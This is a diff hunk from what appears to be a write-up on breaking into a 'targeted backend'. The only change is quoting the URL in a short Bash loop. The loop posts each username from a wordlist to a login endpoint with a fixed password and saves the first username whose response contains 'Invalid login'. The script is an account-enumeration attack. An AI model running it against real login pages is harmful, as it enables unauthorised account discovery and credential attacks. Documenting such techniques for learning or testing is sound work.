@@ -7,7 +7,7 @@ At the beginning, to access the targeted backend, I needed this tiny Bash script
 ```bash
 for w in $(cat $1)
 do
-    r=$(curl -X POST -d "username=$w" -d "password=123" http://$2/login)
+    r=$(curl -X POST -d "username=$w" -d "password=123" "http://$2/login")
     if [[ $r == *"Invalid login"* ]]; then
         echo "$w" > username.txt
         exit 0
